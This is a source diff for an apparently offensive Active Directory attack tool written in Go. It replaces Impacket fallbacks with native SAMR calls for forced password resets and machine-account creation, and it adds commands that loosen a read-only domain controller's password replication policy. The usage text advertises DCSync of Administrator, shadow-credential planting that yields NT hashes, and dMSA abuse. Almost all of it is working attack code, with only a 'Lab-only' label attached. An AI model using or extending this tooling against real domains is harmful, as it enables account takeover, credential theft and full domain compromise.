@@ -7,6 +7,7 @@ import (
 	"github.com/KKingZero/ARK/pkg/drs"
 	"github.com/KKingZero/ARK/pkg/krb"
 	"github.com/KKingZero/ARK/pkg/ldapcli"
+	"github.com/KKingZero/ARK/pkg/samr"
 	"github.com/KKingZero/ARK/pkg/smbcli"
 )
 
@@ -29,6 +30,8 @@ func RunAD(args []string) error {
 		return adDMSA(args[1:])
 	case "dcsync":
 		return adDCSync(args[1:])
+	case "prp":
+		return adPRP(args[1:])
 	default:
 		return fmt.Errorf("unknown ad command %q\n%s", args[0], adUsage)
 	}
@@ -40,7 +43,7 @@ const adUsage = `ark ad — operator-host AD writes (no implant)
       --target jake.h --new-pass-file new.txt --yes [--force]
   ark ad add-computer --dc H --domain D --user U --pass-file P \
       --name ATTACK --computer-pass-file ./mach.pass --out ./mach.pass --yes
-      # LDAP Add first; WILL_NOT_PERFORM → Impacket addcomputer.py -method SAMR (temporary)
+      # LDAP Add first; WILL_NOT_PERFORM → native SAMR over SMB
   ark ad shadow show  --dc H --domain D --user U --pass-file P --target SAM
   ark ad shadow write --dc H --domain D --user U --pass-file P --target SAM --key-file blob --yes
   ark ad shadow auto  --dc H --domain D --user U --hash H --target SAM --out pfx --yes
@@ -50,11 +53,12 @@ const adUsage = `ark ad — operator-host AD writes (no implant)
   ark ad dmsa delete --dc H --domain D --user U --hash H --target dmsa$ --yes
   ark ad dcsync --dc H --domain D --user U --pass-file P --target Administrator --yes
       # one object (EXOP_REPL_OBJ) over Kerberos SMB; asktgt then --ticket session key
+  ark ad prp clear-never-reveal --dc H --domain D --user U --pass-file P --rodc RODC01$ --yes
+  ark ad prp add-reveal --dc H --domain D --user U --pass-file P --rodc RODC01$ --group "Domain Users" --yes
 
 ForceChangePassword / reset via LDAPS unicodePwd replace (no old password).
 Requires --yes. Refuses sAM-prefix passwords unless --force.
-LDAPS unicodePwd first; if that fails, SAMR via samba net rpc password
-(bind secret in PASSWD_FILE, not argv).
+LDAPS unicodePwd first; if that fails, native SAMR (needs Kerberos SMB session key).
 Lab-only. High impact — confirm target. See docs/OPERATOR_PRE_IMPLANT.md
 `
 
@@ -81,6 +85,16 @@ func adPassword(args []string) error {
 	}
 	opts.RequireTLS = true
 	printProxyHint()
+	if err := ResetPassword(opts, target, newPass, force); err != nil {
+		return err
+	}
+	fmt.Printf("OK password reset for %s\n", target)
+	return nil
+}
+
+// ResetPassword is LDAPS unicodePwd then native SAMR (no Impacket/Samba).
+func ResetPassword(opts ldapcli.Options, target, newPass string, force bool) error {
+	opts.RequireTLS = true
 	conn, err := ldapcli.Bind(opts)
 	if err != nil {
 		return err
@@ -91,12 +105,11 @@ func adPassword(args []string) error {
 		return fmt.Errorf("--domain required")
 	}
 	if err := ldapcli.SetPassword(conn, base, target, newPass, force); err != nil {
-		fmt.Printf("LDAP unicodePwd failed: %v\nfalling back to SAMR (net rpc password)\n", err)
-		if ferr := samrSetPassword(opts, target, newPass); ferr != nil {
+		fmt.Printf("LDAP unicodePwd failed: %v\nfalling back to native SAMR\n", err)
+		if ferr := nativeSAMRSetPassword(opts, target, newPass); ferr != nil {
 			return fmt.Errorf("ldap: %v; samr: %w", err, ferr)
 		}
 	}
-	fmt.Printf("OK password reset for %s\n", target)
 	return nil
 }
 
@@ -125,47 +138,136 @@ func adAddComputer(args []string) error {
 	}
 	opts.RequireTLS = true
 	printProxyHint()
-	conn, err := ldapcli.Bind(opts)
+	out := first(f, "out", "pass-out")
+	sam, _, err := AddComputer(opts, name, pass, out)
 	if err != nil {
 		return err
 	}
-	defer conn.Close()
-	base := ldapcli.BaseDN(opts.Domain)
-	if base == "" {
-		return fmt.Errorf("--domain required")
-	}
-	if pass == "" {
-		pass, err = ldapcli.RandomMachinePassword()
-		if err != nil {
-			return err
-		}
-	}
-	sam, err := ldapcli.AddComputer(conn, base, name, pass)
-	if err != nil {
-		if sam == "" && ldapcli.IsWillNotPerform(err) {
-			fmt.Printf("LDAP add WILL_NOT_PERFORM; SAMR via addcomputer.py\n")
-			if ferr := samrAddComputer(opts, name, pass); ferr != nil {
-				return fmt.Errorf("ldap: %v; samr: %w", err, ferr)
-			}
-			clean, serr := ldapcli.SanitizeComputerName(name)
-			if serr != nil {
-				return serr
-			}
-			sam = clean + "$"
-		} else {
-			return err
-		}
-	}
-	if out := first(f, "out", "pass-out"); out != "" {
-		if err := writeSecretFile(out, pass); err != nil {
-			return err
-		}
+	if out != "" {
 		fmt.Printf("OK computer %s  pass-file %s\n", sam, out)
 		return nil
 	}
 	fmt.Printf("OK computer %s\n", sam)
 	fmt.Println("machine password written only if --out PATH given (not echoed)")
 	return nil
+}
+
+// AddComputer LDAP-Adds a workstation; WILL_NOT_PERFORM → native SAMR.
+func AddComputer(opts ldapcli.Options, name, pass, outPath string) (sam, machinePass string, err error) {
+	opts.RequireTLS = true
+	conn, err := ldapcli.Bind(opts)
+	if err != nil {
+		return "", "", err
+	}
+	defer conn.Close()
+	base := ldapcli.BaseDN(opts.Domain)
+	if base == "" {
+		return "", "", fmt.Errorf("--domain required")
+	}
+	if pass == "" {
+		pass, err = ldapcli.RandomMachinePassword()
+		if err != nil {
+			return "", "", err
+		}
+	}
+	sam, err = ldapcli.AddComputer(conn, base, name, pass)
+	if err != nil {
+		if sam == "" && ldapcli.IsWillNotPerform(err) {
+			fmt.Printf("LDAP add WILL_NOT_PERFORM; native SAMR\n")
+			created, ferr := nativeSAMRCreateComputer(opts, name, pass)
+			if ferr != nil {
+				return "", "", fmt.Errorf("ldap: %v; samr: %w", err, ferr)
+			}
+			sam = created
+		} else {
+			return "", "", err
+		}
+	}
+	if outPath != "" {
+		if err := writeSecretFile(outPath, pass); err != nil {
+			return sam, pass, err
+		}
+	}
+	return sam, pass, nil
+}
+
+func nativeSAMRSession(opts ldapcli.Options) (*smbcli.Session, error) {
+	sopts := smbcli.Options{
+		Host:     opts.Host,
+		Domain:   opts.Domain,
+		Username: opts.Username,
+		Password: opts.Password,
+		Hash:     opts.Hash,
+	}
+	if opts.CCache != "" {
+		sopts.Ticket = opts.CCache
+		return smbcli.DialKerberos(sopts)
+	}
+	return smbcli.Dial(sopts)
+}
+
+func nativeSAMRCreateComputer(opts ldapcli.Options, name, pass string) (string, error) {
+	s, err := nativeSAMRSession(opts)
+	if err != nil {
+		return "", err
+	}
+	defer s.Close()
+	return samr.CreateWorkstation(s, opts.Domain, name, pass)
+}
+
+func nativeSAMRSetPassword(opts ldapcli.Options, target, newPass string) error {
+	s, err := nativeSAMRSession(opts)
+	if err != nil {
+		return err
+	}
+	defer s.Close()
+	return samr.SetPassword(s, opts.Domain, target, newPass)
+}
+
+func adPRP(args []string) error {
+	if len(args) < 1 {
+		return fmt.Errorf("usage: ark ad prp <clear-never-reveal|add-reveal> ...")
+	}
+	op := args[0]
+	f, _ := ParseFlags(args[1:])
+	if !flagBool(f, "yes") {
+		return fmt.Errorf("refusing prp %s without --yes", op)
+	}
+	opts, err := ldapOpts(f)
+	if err != nil {
+		return err
+	}
+	opts.RequireTLS = true
+	printProxyHint()
+	conn, err := ldapcli.Bind(opts)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	base := ldapcli.BaseDN(opts.Domain)
+	rodc := first(f, "rodc", "target")
+	switch op {
+	case "clear-never-reveal", "clear":
+		dn, err := ldapcli.ClearNeverReveal(conn, base, rodc)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("OK prp clear-never-reveal %s\n", dn)
+		return nil
+	case "add-reveal", "reveal":
+		group := first(f, "group")
+		if group == "" {
+			return fmt.Errorf("--group required")
+		}
+		dn, err := ldapcli.AddRevealOnDemand(conn, base, rodc, group)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("OK prp add-reveal %s group %s\n", dn, group)
+		return nil
+	default:
+		return fmt.Errorf("usage: ark ad prp <clear-never-reveal|add-reveal>")
+	}
 }
 
 func adShadow(args []string) error {
@@ -250,14 +352,17 @@ func adShadow(args []string) error {
 		}
 		fmt.Printf("OK shadow auto %s blobs=%d pfx=%s device=%x\n", st.TargetSAM, st.Blobs, out, cred.DeviceID)
 		dc := first(f, "dc", "host")
-		nt, err := krb.PKINIT(krb.PKINITOptions{
+		res, err := krb.PKINIT(krb.PKINITOptions{
 			Domain: opts.Domain, Username: target, KDC: dc, PFXPath: out,
 		})
 		if err != nil {
 			fmt.Printf("pfx written; retry: ark kerberos pkinit --pfx %s --dc %s --domain %s --user %s\n", out, dc, opts.Domain, target)
 			return fmt.Errorf("shadow auto planted but unusable: %w", err)
 		}
-		fmt.Printf("NT %s\n", nt)
+		fmt.Printf("NT %s\n", res.NTHash)
+		if res.Ticket.CCache != "" {
+			fmt.Printf("ccache %s\n", res.Ticket.CCache)
+		}
 		return nil
 	default:
 		return fmt.Errorf("usage: ark ad shadow <show|write|auto|clear>")
